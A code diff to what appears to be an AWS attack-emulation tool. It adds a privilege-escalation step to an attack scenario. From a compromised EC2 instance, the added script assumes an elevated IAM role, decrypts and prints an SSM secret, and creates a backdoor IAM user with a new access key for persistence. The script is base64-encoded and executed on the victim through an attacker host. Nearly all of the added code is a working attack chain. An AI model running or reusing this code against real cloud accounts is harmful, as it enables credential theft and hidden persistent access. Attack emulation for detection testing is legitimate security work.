@@ -91,6 +91,7 @@ def scenario_8_execute(manual=False):
     bucket_key = data["Bucket Key"]
     ssm_name = data["SSM Parameter Name"]
     lambda_role_arn = data["Lambda Execution Role Arn"]
+    elevated_role_arn = data["Elevated Role Arn"]
     region = data["Region"]
 
     sleep_duration = 100
@@ -174,6 +175,42 @@ print('Lambda created')
     lambda_cmd = f"python3 -c \"import base64; exec(base64.b64decode('{lambda_b64}').decode())\""
     lambda_out = _run_via_attacker(attacker_ip, victim_ip, lambda_cmd)
     print(colored(f"  Result: {lambda_out[:150]}", color="green"))
+
+    # --- Privilege escalation: AssumeRole from victim EC2, then sensitive data + persistence ---
+    print("-" * 30)
+    print(colored("AssumeRole (privilege escalation from victim EC2)", color="red"))
+    loading_animation()
+    escalation_script = f"""
+import boto3
+role_arn = '{elevated_role_arn}'
+ssm_name = '{ssm_name}'
+region = '{region}'
+sts = boto3.client('sts')
+resp = sts.assume_role(RoleArn=role_arn, RoleSessionName='cobra-s8-escalation')
+creds = resp['Credentials']
+session = boto3.Session(
+    aws_access_key_id=creds['AccessKeyId'],
+    aws_secret_access_key=creds['SecretAccessKey'],
+    aws_session_token=creds['SessionToken'],
+)
+print('AssumeRole: success')
+ssm = session.client('ssm', region_name=region)
+p = ssm.get_parameter(Name=ssm_name, WithDecryption=True)
+print('Secret (assumed role):', p['Parameter']['Value'])
+iam = session.client('iam')
+try:
+    iam.create_user(UserName='cobra-s8-persist')
+except iam.exceptions.EntityAlreadyExistsException:
+    pass
+ak = iam.create_access_key(UserName='cobra-s8-persist')
+print('IAM user created, KeyId:', ak['AccessKey']['AccessKeyId'])
+"""
+    esc_b64 = base64.b64encode(escalation_script.strip().encode()).decode()
+    esc_cmd = f"python3 -c \"import base64; exec(base64.b64decode('{esc_b64}').decode())\""
+    esc_out = _run_via_attacker(attacker_ip, victim_ip, esc_cmd)
+    for line in esc_out.split("\n")[:5]:
+        if line.strip():
+            print(colored(f"  {line.strip()}", color="green"))
 
     print("-" * 30)
     print(colored("Scenario 8 executed successfully!", color="green"))
